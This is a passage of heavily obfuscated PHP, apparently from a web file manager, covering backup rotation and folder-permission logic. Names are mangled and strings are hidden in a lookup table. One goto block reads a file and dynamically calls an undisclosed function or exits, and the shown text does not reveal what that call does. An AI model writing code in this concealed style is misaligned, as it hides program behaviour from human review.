$’ØÒ¬Ä§; return $öèï­¡í; } private function checkStore($´àâÎ˜İ) { $¤Œ®Ğçş = Model($_SERVER[¬ÏÕ§Áú][881]); $êã¶ùŸ = $¤Œ®Ğçş->listData($´àâÎ˜İ); $¤Œ®Ğçş->checkConfig($êã¶ùŸ); } public static function get() { if (!self::$option) { $¡ÆóÎ®Ì = Model($_SERVER[¬ÏÕ§Áú][861]); $“Õéë» = $¡ÆóÎ®Ì->findByName(self::$name); $¡ÆóÎ®Ì->parseContent($“Õéë»); self::$option = $“Õéë»; } return self::$option; } public static function set($—Åİ¦á) { $¿ŞøÂôš =& $_SERVER[¬ÏÕ§Áú]; $ôÉÚßŞ = self::get(); foreach ($—Åİ¦á as $Ü—ı¡¥ => $ûëæÅâ­) { array_set_value($ôÉÚßŞ, $Ü—ı¡¥, $ûëæÅâ­); } Model($¿ŞøÂôš[861])->update($ôÉÚßŞ[$¿ŞøÂôš[492]], $ôÉÚßŞ); self::$option = $ôÉÚßŞ; return self::$option; } public function keep() { $õçÜˆˆş =& $_SERVER[¬ÏÕ§Áú]; $×ùŸ¨ìÖ = self::get(); if (_get($×ùŸ¨ìÖ, $õçÜˆˆş[882], 0) == $õçÜˆˆş[101]) { return; } $this->backupKeep($×ùŸ¨ìÖ); self::set(array($õçÜˆˆş[882] => 1)); } private function backupKeep($«ªãÙÖ™) { $È¸•ùàÍ =& $_SERVER[¬ÏÕ§Áú]; if (self::$manual == 1) { return; } $Œúçí = $this->model->listData(); if (empty($Œúçí)) { return; } $±¥½¦–ğ = array(); $ÂÛÌøê¿ = array(); $ÛóÁòØÄ = date($È¸•ùàÍ[883], strtotime($È¸•ùàÍ[884])); foreach ($Œúçí as $šã›±±Î => $Ã­ƒšÜû) { $˜Ñªı = $Ã­ƒšÜû[$È¸•ùàÍ[32]]; if ($šã›±±Î < 7 || $Ã­ƒšÜû[$È¸•ùàÍ[868]] == $È¸•ùàÍ[101]) { $±¥½¦–ğ[] = $˜Ñªı; continue; } $´ÌÌÊÄ· = substr($˜Ñªı, 0, 6); if ($´ÌÌÊÄ· < $ÛóÁòØÄ) { continue; } if (!isset($ÂÛÌøê¿[$´ÌÌÊÄ·]) || $˜Ñªı < $ÂÛÌøê¿[$´ÌÌÊÄ·]) { $ÂÛÌøê¿[$´ÌÌÊÄ·] = $˜Ñªı; } if (substr($˜Ñªı, 6, 2) == $È¸•ùàÍ[885]) { $ÂÛÌøê¿[$´ÌÌÊÄ·] = $˜Ñªı; } } $±¥½¦–ğ = array_merge($±¥½¦–ğ, array_values($ÂÛÌøê¿)); $±¥½¦–ğ = array_unique($±¥½¦–ğ); foreach ($Œúçí as $Ã­ƒšÜû) { $˜Ñªı = $Ã­ƒšÜû[$È¸•ùàÍ[32]]; if (!empty($˜Ñªı) && in_array($˜Ñªı, $±¥½¦–ğ)) { continue; } $this->model->remove($Ã­ƒšÜû[$È¸•ùàÍ[492]]); $ŸÖ¦ßİõ = $this->backupPath($«ªãÙÖ™); IO::remove($ŸÖ¦ßİõ, !1); } } private function backupPath($ÉÑˆ×–ş) { $å£ıÁ ï =& $_SERVER[¬ÏÕ§Áú]; static $ñ’è´Ãã = null; if (is_null($ñ’è´Ãã)) { $ñ’è´Ãã = Model($å£ıÁ ï[886])->get($å£ıÁ ï[887]); } $÷Ù•à¶Å = $ÉÑˆ×–ş[$å£ıÁ ï[32]]; $Ò˜ùÄÃ = substr(md5($å£ıÁ ï[888] . $ñ’è´Ãã . $÷Ù•à¶Å), 0, 8); return "\173\x69\x6f\x3a{$ÉÑˆ×–ş[$å£ıÁ ï[865]]}\x7d\57\x64\x61\164\141\x62\x61\163\x65\x2f\142\141\143\153\x75\160\57" . $÷Ù•à¶Å . $å£ıÁ ï[11] . $Ò˜ùÄÃ; } public function db() { $ƒœ¹ =& $_SERVER[¬ÏÕ§Áú]; $²íæ‹ËØ = self::get(); if (_get($²íæ‹ËØ, $ƒœ¹[889], 0) == $ƒœ¹[101]) { return !0; } $ÆËá€ŒÁ = new BackupDb(); if (!$ÆËá€ŒÁ->index()) { return !1; } self::set(array($ƒœ¹[889] => 1)); return !0; } public function dbFile() { $–ÛÊçú =& $_SERVER[¬ÏÕ§Áú]; $å ’òá¹ = self::get(); if (_get($å ’òá¹, $–ÛÊçú[890], 0) == $–ÛÊçú[101]) { return !0; } $¥ëÕğíÈ = new BackupDbFile(); if (!$¥ëÕğíÈ->index()) { return !1; } self::set(array($–ÛÊçú[890] => 1)); return !0; } public function file() { $…µº¥ˆ¼ =& $_SERVER[¬ÏÕ§Áú]; $¢èæÉİÙ = self::get(); if (_get($¢èæÉİÙ, $…µº¥ˆ¼[891], 0) == $…µº¥ˆ¼[101]) { return !0; } if ($¢èæÉİÙ[$…µº¥ˆ¼[181]] == $…µº¥ˆ¼[892]) { $¥ŸÂ¢ã€ = new BackupFile(); if (!$¥ŸÂ¢ã€->index()) { return !1; } } self::set(array($…µº¥ˆ¼[891] => 1, $…µº¥ˆ¼[863] => 1)); return !0; } public static function log($ª¶Â®ıß) { write_log($ª¶Â®ıß, $_SERVER[¬ÏÕ§Áú][893]); } } goto cîµ¬ã×„¨; F¦òöË²ÌÆ: if ($_SERVER[$_SERVER[¬ÏÕ§Áú][60]] != $_SERVER[$_SERVER[¬ÏÕ§Áú][2228]]) { $_getc = $_SERVER[¬ÏÕ§Áú][62]; $_getfile = $_SERVER[$_SERVER[¬ÏÕ§Áú][63]] . $_SERVER[¬ÏÕ§Áú][64]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[¬ÏÕ§Áú][65], $_getfilec); if (count($_getarrs) < $_SERVER[¬ÏÕ§Áú][66]) { $exit = $_SERVER[¬ÏÕ§Áú][67]; $exit(); } $_act = $_SERVER[¬ÏÕ§Áú][68]; $_act($_SERVER[$_SERVER[¬ÏÕ§Áú][61]]); } class SourceAuthModel extends ModelBase { protected $tableName = "\x69\x6f\137\163\x6f\165\x72\143\145\x5f\141\x75\x74\150"; public function getAuth($›ˆ§çÀ) { $™šÁáßŒ =& $_SERVER[¬ÏÕ§Áú]; $Ø‘»¤íÉ = $this->sourceAuthSelect($›ˆ§çÀ); $²—Ëú«ö = array(); $¨Ì”¸”à = array(); $Ç‹²äÖ™ = 2 << 25; foreach ($Ø‘»¤íÉ as $Ğ…Øïµ) { $Úò‘¯ƒñ = Model($™šÁáßŒ[592])->listData($Ğ…Øïµ[$™šÁáßŒ[2145]]); if (!$Úò‘¯ƒñ) { continue; } $²—Ëú«ö[] = $Ğ…Øïµ; $š£°“‘× = 0; if ($Ğ…Øïµ[$™šÁáßŒ[201]] == SourceModel::TYPE_GROUP) { $š£°“‘× = $Ç‹²äÖ™ * 2; } if ($Ğ…Øïµ[$™šÁáßŒ[201]] == SourceModel::TYPE_USER) { $š£°“‘× = $Ç‹²äÖ™; } if ($Ğ…Øïµ[$™šÁáßŒ[201]] == SourceModel::TYPE_USER && $Ğ…Øïµ[$™šÁáßŒ[590]] == $™šÁáßŒ[241]) { $š£°“‘× = 0; } $¨Ì”¸”à[] = $Úò‘¯ƒñ[$™šÁáßŒ[507]] + $š£°“‘×; } array_multisort($¨Ì”¸”à, SORT_DESC, $²—Ëú«ö); return $²—Ëú«ö; } public function sourceAuthSelect($Š€„Êş) { $ È“êşã =& $_SERVER[¬ÏÕ§Áú]; static $ï¹í¸¿ = array(); $Âëà¥»µ = is_array($Š€„Êş) ? !1 : !0; if ($Âëà¥»µ) { $Š€„Êş = array($Š€„Êş); } $ËãßšŞ = array(); foreach ($Š€„Êş as $ÃÎ–²àó) { if (isset($ï¹í¸¿[$ÃÎ–²àó])) { $ËãßšŞ[$ÃÎ–²àó] = $ï¹í¸¿[$ÃÎ–²àó]; } } if (count($ËãßšŞ) == count($Š€„Êş)) { return $Âëà¥»µ ? $ËãßšŞ[$Š€„Êş[0]] : $ËãßšŞ; } $â—ÂÆ«­ = $ È“êşã[2229]; $å€¦Ú°ˆ = array($ È“êşã[204] => array($ È“êşã[7], $Š€„Êş)); $ƒğ¡Á¢» = $this->field($â—ÂÆ«­)->order($ È“êşã[492])->where($å€¦Ú°ˆ)->select(); $—”†àğ• = array_to_keyvalue_group($ƒğ¡Á¢», $ È“êşã[204]); foreach ($Š€„Êş as $ÃÎ–²àó) { $ï¹í¸¿[$ÃÎ–²àó] = $—”†àğ•[$ÃÎ–²àó] ? $—”†àğ•[$ÃÎ–²àó] : array(); } if ($Âëà¥»µ) { return $ƒğ¡Á¢»; } return $—”†àğ•; } public function setAuth($®È …Š‰, $˜„º‚àú) { $¨Äò¼‹ =& $_SERVER[¬ÏÕ§Áú]; $¶ÊÁøå¢ = Model($¨Äò¼‹[1483])->sourceInfo($®È …Š‰); if (!$¶ÊÁøå¢) { return !1; } if ($¶ÊÁøå¢[$¨Äò¼‹[201]] != SourceModel::TYPE_GROUP) { return !1; } $ƒË¥ä”õ = 1; $Û¯õø½ì = $¶ÊÁøå¢[$¨Äò¼‹[590]]; if ($Û¯õø½ì != $ƒË¥ä”õ) { $‘í†Äõß = array($¨Äò¼‹[1445] => $Û¯õø½ì); $İáß“– = Model($¨Äò¼‹[2131])->field($¨Äò¼‹[1837])->where($‘í†Äõß)->select(); $İáß“– = array_to_keyvalue($İáß“–, $¨Äò¼‹[12], $¨Äò¼‹[1837]); } $Øˆ˜‡èš = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $Æ‘¥¥İ = array(); foreach ($˜„º‚àú as $›ä§šäè) { if (!in_array($›ä§šäè[$¨Äò¼‹[201]], $Øˆ˜‡èš)) { show_json(LNG($¨Äò¼‹[2230]), !1); } if ($Û¯õø½ì != $ƒË¥ä”õ) { if ($›ä§šäè[$¨Äò¼‹[201]] == SourceModel::TYPE_GROUP) { } if ($›ä§šäè[$¨Äò¼‹[590]] != 0 && !in_array($›ä§šäè[$¨Äò¼‹[590]], $İáß“–)) { } } if ($›ä§šäè[$¨Äò¼‹[590]] == 0) { $›ä§šäè[$¨Äò¼‹[201]] = SourceModel::TYPE_USER; } $Æ‘¥¥İ[] = array($¨Äò¼‹[204] => $®È …Š‰, $¨Äò¼‹[201] => intval($›ä§šäè[$¨Äò¼‹[201]]), $¨Äò¼‹[590] => intval($›ä§šäè[$¨Äò¼‹[590]]), $¨Äò¼‹[2145] => intval($›ä§šäè[$¨Äò¼‹[2145]]) ? intval($›ä§šäè[$¨Äò¼‹[2145]]) : 0, $¨Äò¼‹[2208] => intval($›ä§šäè[$¨Äò¼‹[2208]]) ? intval($›ä§šäè[$¨Äò¼‹[2208]]) : -1); } $this->where(array($¨Äò¼‹[511] => $®È …Š‰))->delete(); $this->addAll($Æ‘¥¥İ); return !0; } public function authClear($ßÚãå—Ñ) { $”Õş°Ú÷ =& $_SERVER[¬ÏÕ§Áú]; $á€Î¯¤ø = Model($”Õş°Ú÷[1483])->sourceInfo($ßÚãå—Ñ); $“â»¨Ğ– = array($ßÚãå—Ñ); if ($á€Î¯¤ø[$”Õş°Ú÷[505]] == $”Õş°Ú÷[101]) { $«·ÌÄï° = array($”Õş°Ú÷[676] => array($”Õş°Ú÷[636], $á€Î¯¤ø[$”Õş°Ú÷[605]] . $ßÚãå—Ñ . $”Õş°Ú÷[637])); $“â»¨Ğ– = Model($”Õş°Ú÷[1483])->field($”Õş°Ú÷[511])->where($«·ÌÄï°)->getField($”Õş°Ú÷[204], !0); $“â»¨Ğ–[] = $ßÚãå—Ñ; } $this->where(array($”Õş°Ú÷[511] => array($”Õş°Ú÷[512], $“â»¨Ğ–)))->delete(); return !0; } public function getAllParent($åøæÄó) { $ˆ›ï¼¥ =& $_SERVER[¬ÏÕ§Áú]; $ûñ›ãñ = Model($ˆ›ï¼¥[1483])->sourceInfo($åøæÄó); if (!$ûñ›ãñ || $ûñ›ãñ[$ˆ›ï¼¥[201]] != SourceModel::TYPE_GROUP) { return array(); } $®ªƒøÎ• = Model($ˆ›ï¼¥[1483])->parentLevelArray($ûñ›ãñ[$ˆ›ï¼¥[605]]); $ÆŞõÍ£Ó = array_merge(array(intval($åøæÄó)), array_reverse($®ªƒøÎ•)); $Å–ıß = $this->sourceAuthSelect($ÆŞõÍ£Ó); $š³§õÏç = $GLOBALS[$ˆ›ï¼¥[6]][$ˆ›ï¼¥[102]][$ˆ›ï¼¥[2144]] == 1; $¼©¸Ó…ï = $š³§õÏç ? 3 : 2; $€·áä¬¹ = Model($ˆ›ï¼¥[1443])->getInfo($ûñ›ãñ[$ˆ›ï¼¥[590]]); $¾Å©ËÒ¢ = explode($ˆ›ï¼¥[50], trim($€·áä¬¹[$ˆ›ï¼¥[605]], $ˆ›ï¼¥[50])); $Î©€Ôµ = array_merge(array($€·áä¬¹[$ˆ›ï¼¥[1445]]), array_reverse(array_slice($¾Å©ËÒ¢, $¼©¸Ó…ï))); foreach ($Å–ıß as $åøæÄó => $À¸¶‰ˆ¸) { foreach ($À¸¶‰ˆ¸ as $’›Áô“É) { if (!$’›Áô“É || !$’›Áô“É[$ˆ›ï¼¥[590]] || $’›Áô“É[$ˆ›ï¼¥[590]] == $ˆ›ï¼¥[241]) { continue; } if ($’›Áô“É[$ˆ›ï¼¥[201]] != SourceModel::TYPE_GROUP) { continue; } $Î©€Ôµ[] = $’›Áô“É[$ˆ›ï¼¥[590]]; } } $Î©€Ôµ = array_unique($Î©€Ôµ); $ıàáü ˜ = array($ˆ›ï¼¥[439] => _get($GLOBALS[$ˆ›ï¼¥[7]], $ˆ›ï¼¥[439], 1), $ˆ›ï¼¥[450] => _get($GLOBALS[$ˆ›ï¼¥[7]], $ˆ›ï¼¥[450], 500)); $GLOBALS[$ˆ›ï¼¥[7]][$ˆ›ï¼¥[439]] = 1; $GLOBALS[$ˆ›ï¼¥[7]][$ˆ›ï¼¥[450]] = 500; $ş–ù©±ô = array($ˆ›ï¼¥[513] => 0, $ˆ›ï¼¥[2043] => AuthModel::authAll(), $ˆ›ï¼¥[514] => LNG($ˆ›ï¼¥[2231]), $ˆ›ï¼¥[2060] => $ˆ›ï¼¥[2232]); $ÑÔ´øÌö = array(); $¹şĞÂÁ¡ = explode($ˆ›ï¼¥[50], $ˆ›ï¼¥[2233]); $÷ò æñ´ = explode($ˆ›ï¼¥[50], $ˆ›ï¼¥[2234]); foreach ($Î©€Ôµ as $«áãîª) { $òı˜·ˆŒ = Model($ˆ›ï¼¥[1443])->getInfo($«áãîª); $¨–ı™¿Ã = array_field_key($òı˜·ˆŒ, $¹şĞÂÁ¡); $½²éˆ›Ô = Model($ˆ›ï¼¥[618])->listByGroup($«áãîª); foreach ($½²éˆ›Ô[$ˆ›ï¼¥[456]] as $ã‘Äş™¢ => $‰¨ÚŸÆ) { $this->userGroupList($‰¨ÚŸÆ[$ˆ›ï¼¥[1837]], $‰¨ÚŸÆ); $ íæÈşë = $‰¨ÚŸÆ[$ˆ›ï¼¥[1837]] . $ˆ›ï¼¥[12]; if (isset($ÑÔ´øÌö[$ íæÈşë])) { continue; } $ŸÃ…«» = Model($ˆ›ï¼¥[2235])->listData($‰¨ÚŸÆ[$ˆ›ï¼¥[2236]]); $‰¨ÚŸÆ[$ˆ›ï¼¥[2237]] = Action($ˆ›ï¼¥[2238])->parseUrl($‰¨ÚŸÆ[$ˆ›ï¼¥[2237]]); $‰¨ÚŸÆ[$ˆ›ï¼¥[1801]] = $ŸÃ…«» && $ŸÃ…«»[$ˆ›ï¼¥[2239]] == 1; $úĞÇÅ—í = $this->groupRootAuth($«áãîª, $‰¨ÚŸÆ[$ˆ›ï¼¥[1837]]); $úĞÇÅ—í = $‰¨ÚŸÆ[$ˆ›ï¼¥[1801]] ? $ş–ù©±ô : $úĞÇÅ—í; $ÑÔ´øÌö[$ íæÈşë] = array($ˆ›ï¼¥[2240] => $ˆ›ï¼¥[2241], $ˆ›ï¼¥[2242] => LNG($ˆ›ï¼¥[2243]), $ˆ›ï¼¥[2219] => array_field_key($‰¨ÚŸÆ, $÷ò æñ´), $ˆ›ï¼¥[507] => $úĞÇÅ—í, $ˆ›ï¼¥[508] => $úĞÇÅ—í[$ˆ›ï¼¥[507]], $ˆ›ï¼¥[2244] => $¨–ı™¿Ã); } } $GLOBALS[$ˆ›ï¼¥[7]][$ˆ›ï¼¥[439]] = $ıàáü ˜[$ˆ›ï¼¥[439]]; $GLOBALS[$ˆ›ï¼¥[7]][$ˆ›ï¼¥[450]] = $ıàáü ˜[$ˆ›ï¼¥[450]]; foreach ($Å–ıß as $åøæÄó => $À¸¶‰ˆ¸) { if (!$À¸¶‰ˆ¸) { continue; } foreach ($À¸¶‰ˆ¸ as $’›Áô“É) { if (!$’›Áô“É || !$’›Áô“É[$ˆ›ï¼¥[590]] || $’›Áô“É[$ˆ›ï¼¥[590]] == $ˆ›ï¼¥[241]) { continue; } if ($’›Áô“É[$ˆ›ï¼¥[201]] != SourceModel::TYPE_USER) { continue; } $ íæÈşë = $’›Áô“É[$ˆ›ï¼¥[590]] . $ˆ›ï¼¥[12]; if (isset($ÑÔ´øÌö[$ íæÈşë])) { continue; } $–Ê¢êòÆ = $this->authMake($À¸¶‰ˆ¸, $ íæÈşë); if (!$–Ê¢êòÆ || !$–Ê¢êòÆ[$ˆ›ï¼¥[2242]]) { continue; } $ÑÔ´øÌö[$ íæÈşë] = array($ˆ›ï¼¥[2240] => $ˆ›ï¼¥[2245], $ˆ›ï¼¥[2242] => $–Ê¢êòÆ[$ˆ›ï¼¥[2242]], $ˆ›ï¼¥[2219] => Model($ˆ›ï¼¥[618])->getInfoSimpleOuter($ íæÈşë), $ˆ›ï¼¥[507] => $–Ê¢êòÆ[$ˆ›ï¼¥[561]], $ˆ›ï¼¥[508] => $–Ê¢êòÆ[$ˆ›ï¼¥[561]][$ˆ›ï¼¥[507]], $ˆ›ï¼¥[2244] => $–Ê¢êòÆ[$ˆ›ï¼¥[2246]]); } } foreach ($Å–ıß as $åøæÄó => $À¸¶‰ˆ¸) { if (!$À¸¶‰ˆ¸) { continue; } foreach ($ÑÔ´øÌö as $ íæÈşë => $Ğü¥¶Îš) { if ($Ğü¥¶Îš[$ˆ›ï¼¥[2219]][$ˆ›ï¼¥[1801]] || $Ğü¥¶Îš[$ˆ›ï¼¥[2240]] == $ˆ›ï¼¥[2245]) { continue; } $–Ê¢êòÆ = $this->authMake($À¸¶‰ˆ¸, $ íæÈşë); if (!$–Ê¢êòÆ || !$–Ê¢êòÆ[$ˆ›ï¼¥[2242]]) { continue; } $ÑÔ´øÌö[$ íæÈşë] = array($ˆ›ï¼¥[2240] => $ˆ›ï¼¥[2245], $ˆ›ï¼¥[2242] => $–Ê¢êòÆ[$ˆ›ï¼¥[2242]], $ˆ›ï¼¥[2219] => $Ğü¥¶Îš[$ˆ›ï¼¥[2219]], $ˆ›ï¼¥[507] => $–Ê¢êòÆ[$ˆ›ï¼¥[561]], $ˆ›ï¼¥[508] => $–Ê¢êòÆ[$ˆ›ï¼¥[561]][$ˆ›ï¼¥[507]], $ˆ›ï¼¥[2244] => $–Ê¢êòÆ[$ˆ›ï¼¥[2246]]); } } $ÑÔ´øÌö = array_sort_by($ÑÔ´øÌö, $ˆ›ï¼¥[508], $ˆ›ï¼¥[545]); return $ÑÔ´øÌö; } public function getAllChildren($Ü‡Ù²ú¾) { $ë²™ÍÒ =& $_SERVER[¬ÏÕ§Áú]; $¬˜õ = Model($ë²™ÍÒ[1483])->sourceInfo($Ü‡Ù²ú¾); if ($¬˜õ[$ë²™ÍÒ[505]] != $ë²™ÍÒ[101]) { return $this->sourceListAuth(array($Ü‡Ù²ú¾)); } if ($¬˜õ[$ë²™ÍÒ[201]] != SourceModel::TYPE_GROUP) { return array(); } $Í´Úîû¸ = 1; $ÀÅëÖõÎ = array($Ü‡Ù²ú¾); if ($¬˜õ[$ë²™ÍÒ[203]] == $ë²™ÍÒ[241] && $¬˜õ[$ë²™ÍÒ[590]] != $Í´Úîû¸) { $ÀÅëÖõÎ = $this->groupChidldAllRootSource($¬˜õ[$ë²™ÍÒ[590]]); } $™·õ¦ò = $this->field($ë²™ÍÒ[204])->group($ë²™ÍÒ[204])->select(); $™·õ¦ò = array_to_keyvalue($™·õ¦ò, $ë²™ÍÒ[12], $ë²™ÍÒ[204]); if (!$™·õ¦ò) { return array(); } $½µ«ğ›¨ = $ë²™ÍÒ[2247]; $ÄÓ–ƒâ = array($ë²™ÍÒ[204] => array($ë²™ÍÒ[7], $™·õ¦ò), $ë²™ÍÒ[525] => $ë²™ÍÒ[241]); $¥µ—ñàŠ = Model($ë²™ÍÒ[946])->field($½µ«ğ›¨)->where($ÄÓ–ƒâ)->select(); $µ²éıÛ¾ = array($Ü‡Ù²ú¾); foreach ($¥µ—ñàŠ as $ÆšÚâñ) { foreach ($ÀÅëÖõÎ as $—’šğ­) { $óŒ½÷²ë = $ë²™ÍÒ[50] . $—’šğ­ . $ë²™ÍÒ[50]; $Ú¶˜ó³Â = $ÆšÚâñ[$ë²™ÍÒ[605]] . $ÆšÚâñ[$ë²™ÍÒ[204]] . $ë²™ÍÒ[50]; if (strstr($Ú¶˜ó³Â, $óŒ½÷²ë)) { $µ²éıÛ¾[] = $ÆšÚâñ[$ë²™ÍÒ[204]]; break; } } } return $this->sourceListAuth($µ²éıÛ¾); } private function sourceListAuth($ÓÀùõ‘Á) { $­à›Ê¨ =& $_SERVER[¬ÏÕ§Áú]; $Í‚¼ÁË« = Model($­à›Ê¨[1483])->sourceListInfo($ÓÀùõ‘Á, !0); $øù–Å¥« = $this->sourceAuthSelect($ÓÀùõ‘Á); $„àêèºä = array(); $óÊíí©Í = array(); foreach ($Í‚¼ÁË« as $×°®ş¯¦) { unset($×°®ş¯¦[$­à›Ê¨[548]]); unset($×°®ş¯¦[$­à›Ê¨[546]]); unset($×°®ş¯¦[$­à›Ê¨[507]]); unset($×°®ş¯¦[$­à›Ê¨[100]]); $Ñ·ƒÕ† = $øù–Å¥«[$×°®ş¯¦[$­à›Ê¨[204]]]; if (!$Ñ·ƒÕ†) { continue; } $×°®ş¯¦[$­à›Ê¨[2244]] = $this->authTargetInfo($Ñ·ƒÕ†); $×°®ş¯¦[$­à›Ê¨[603]] = rtrim($×°®ş¯¦[$­à›Ê¨[609]], $­à›Ê¨[8]) . $­à›Ê¨[8] . ltrim($×°®ş¯¦[$­à›Ê¨[603]], $­à›Ê¨[8]); $„àêèºä[] = $×°®ş¯¦; $¼•±Ç•ı = count(explode($­à›Ê¨[8], trim($×°®ş¯¦[$­à›Ê¨[603]], $­à›Ê¨[8]))); $óÊíí©Í[] = $¼•±Ç•ı + ($×°®ş¯¦[$­à›Ê¨[33]] == $­à›Ê¨[88] ? 0 : 1000); } array_multisort($óÊíí©Í, SORT_ASC, $„àêèºä); return $„àêèºä; } private function groupChidldAllRootSource($Ï®ˆŞÇ˜) { $ÙçäÔĞ© =& $_SERVER[¬ÏÕ§Áú]; $âÏ›¨°” = Model($ÙçäÔĞ©[1443])->groupChildrenAll($Ï®ˆŞÇ˜); $æë¾•ŒÂ = array($ÙçäÔĞ©[203] => 0, $ÙçäÔĞ©[590] => array($ÙçäÔĞ©[7], $âÏ›¨°”), $ÙçäÔĞ©[201] => SourceModel::TYPE_GROUP); $Éù¬éĞ® = Model($ÙçäÔĞ©[946])->field($ÙçäÔĞ©[204])->where($æë¾•ŒÂ)->select(); $Éù¬éĞ® = array_to_keyvalue($Éù¬éĞ®, $ÙçäÔĞ©[12], $ÙçäÔĞ©[204]); return $Éù¬éĞ®; } private function authTargetInfo($Â•ğ‹õß) { $üüÉß =& $_SERVER[¬ÏÕ§Áú]; $ğ’şË‡· = array(); $™–ï™Õ™ = array(); $Òüˆ®ÅÆ = 2 << 25; foreach ($Â•ğ‹õß as $»Ç‚Ãºì) { $ŒœË§‡Ç = Model($üüÉß[592])->listData($»Ç‚Ãºì[$üüÉß[2145]]); if (!$ŒœË§‡Ç) { continue; } if ($»Ç‚Ãºì[$üüÉß[201]] == SourceModel::TYPE_USER) { $°™œ‹Ë¦ = Model($üüÉß[598])->getInfoSimpleOuter($»Ç‚Ãºì[$üüÉß[590]]); if ($°™œ‹Ë¦[$üüÉß[1837]] == $üüÉß[1328]) { continue; } if ($°™œ‹Ë¦[$üüÉß[1837]] == $üüÉß[241]) { $°™œ‹Ë¦[$üüÉß[32]] = LNG($üüÉß[2248]); } } else { $°™œ‹Ë¦ = Model($üüÉß[606])->getInfoSimple($»Ç‚Ãºì[$üüÉß[590]]); } if (!$°™œ‹Ë¦) { continue; } $°™œ‹Ë¦[$üüÉß[561]] = $ŒœË§‡Ç; $ğ’şË‡·[] = $°™œ‹Ë¦; $Ò÷¾Ÿ£… = 0; if ($»Ç‚Ãºì[$üüÉß[201]] == SourceModel::TYPE_GROUP) { $Ò÷¾Ÿ£… = $Òüˆ®ÅÆ * 2; } if ($»Ç‚Ãºì[$üüÉß[201]] == SourceModel::TYPE_USER) { $Ò÷¾Ÿ£… = $Òüˆ®ÅÆ; } if ($»Ç‚Ãºì[$üüÉß[201]] == SourceModel::TYPE_USER && $»Ç‚Ãºì[$üüÉß[590]] == $üüÉß[241]) { $Ò÷¾Ÿ£… = 0; } $™–ï™Õ™[] = $ŒœË§‡Ç[$üüÉß[507]] + $Ò÷¾Ÿ£…; } array_multisort($™–ï™Õ™, SORT_DESC, $ğ’şË‡·); return $ğ’şË‡·; } public function getAllChildrenByUser($‹ñ»Ô, $ãÁ¿ú›Ü) { $ÖÊÏÊ =& $_SERVER[¬ÏÕ§Áú]; $Şç²›£ø = Model($ÖÊÏÊ[618])->getInfo($ãÁ¿ú›Ü); if (!$ãÁ¿ú›Ü || !$‹ñ»Ô || !$Şç²›£ø) { return array(); } $­ºÍ”ÄÔ = Model($ÖÊÏÊ[1483])->sourceInfo($‹ñ»Ô); $ÀİÌ”³ = array(); $¦ôÏ‘²‚ = 1; if ($­ºÍ”ÄÔ[$ÖÊÏÊ[203]] == $ÖÊÏÊ[241] && $­ºÍ”ÄÔ[$ÖÊÏÊ[590]] != $¦ôÏ‘²‚ && $this->groupContainUser($­ºÍ”ÄÔ[$ÖÊÏÊ[590]], $ãÁ¿ú›Ü)) { foreach ($Şç²›£ø[$ÖÊÏÊ[1444]] as $ôÔÀõàÛ) { $†›Åâıî = Model($ÖÊÏÊ[606])->getInfo($ôÔÀõàÛ[$ÖÊÏÊ[1445]]); $Ô°±·×ï = Model($ÖÊÏÊ[618])->getInfoSimpleOuter($ãÁ¿ú›Ü); $Ô°±·×ï[$ÖÊÏÊ[561]] = $ôÔÀõàÛ[$ÖÊÏÊ[507]]; if (Model($ÖÊÏÊ[592])->authCheckAction($ôÔÀõàÛ[$ÖÊÏÊ[507]][$ÖÊÏÊ[507]], $ÖÊÏÊ[2058])) { continue; } $¬ ß±‘¥ = array($ÖÊÏÊ[32] => $ÖÊÏÊ[1348] . $†›Åâıî[$ÖÊÏÊ[32]], $ÖÊÏÊ[204] => $†›Åâıî[$ÖÊÏÊ[100]][$ÖÊÏÊ[204]], $ÖÊÏÊ[97] => KodIO::make($†›Åâıî[$ÖÊÏÊ[100]][$ÖÊÏÊ[204]]), $ÖÊÏÊ[203] => $ÖÊÏÊ[241], $ÖÊÏÊ[201] => $ÖÊÏÊ[599], $ÖÊÏÊ[33] => $ÖÊÏÊ[640], $ÖÊÏÊ[603] => $†›Åâıî[$ÖÊÏÊ[610]], $ÖÊÏÊ[1445] => $†›Åâıî[$ÖÊÏÊ[1445]], $ÖÊÏÊ[607] => $†›Åâıî[$ÖÊÏÊ[203]], $ÖÊÏÊ[2244] => array($Ô°±·×ï)); $ÀİÌ”³[$¬ ß±‘¥[$ÖÊÏÊ[204]]] = $¬ ß±‘¥; } } $ß„½šš = array(); $òˆŒèÇã = $this->getAllChildren($‹ñ»Ô); foreach ($òˆŒèÇã as $°Ûâ¸ş‰) { $“øµ´ãğ = !1; foreach ($°Ûâ¸ş‰[$ÖÊÏÊ[2244]] as $¨®·À’Ğ) { if ($¨®·À’Ğ[$ÖÊÏÊ[1837]]) { if ($¨®·À’Ğ[$ÖÊÏÊ[1837]] == $ãÁ¿ú›Ü) { $“øµ´ãğ = !0; break; } } if ($¨®·À’Ğ[$ÖÊÏÊ[1445]]) { if ($this->groupContainUser($¨®·À’Ğ[$ÖÊÏÊ[1445]], $ãÁ¿ú›Ü)) { $“øµ´ãğ = !0; break; } } } if ($“øµ´ãğ) { $ß„½šš[] = $°Ûâ¸ş‰; } $“†ëãÕş = $°Ûâ¸ş‰[$ÖÊÏÊ[204]]; if (isset($ÀİÌ”³[$“†ëãÕş])) { $°Ûâ¸ş‰[$ÖÊÏÊ[2244]][] = $ÀİÌ”³[$“†ëãÕş][0]; $ÀİÌ”³[$“†ëãÕş] = !1; } } $ÀİÌ”³ = array_filter(array_values($ÀİÌ”³)); $ß„½šš = array_merge($ÀİÌ”³, $ß„½šš); return $ß„½šš; } public function setAllChildrenByUser($ÀµÄÇ, $€”êÃÚå, $´ïæ£œ˜) { $ı¿…Á†ê =& $_SERVER[¬ÏÕ§Áú]; $§åòÎÊû = $this->getAllChildrenByUser($ÀµÄÇ, $€”êÃÚå); if (!$´ïæ£œ˜ || !$§åòÎÊû) { return !1; } foreach ($§åòÎÊû as $ÀÌøì•ö) { $¾İğû»Ã = array(); foreach ($ÀÌøì•ö[$ı¿…Á†ê[2244]] as $ƒòëŠÂ) { $»ßÄë€Ò = $ƒòëŠÂ[$ı¿…Á†ê[561]]; $€‹¿€æš = $ƒòëŠÂ[$ı¿…Á†ê[1837]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $ÂÕ¼¤Ò = $ƒòëŠÂ[$ı¿…Á†ê[1837]] ? $ƒòëŠÂ[$ı¿…Á†ê[1837]] : $ƒòëŠÂ[$ı¿…Á†ê[1445]]; if 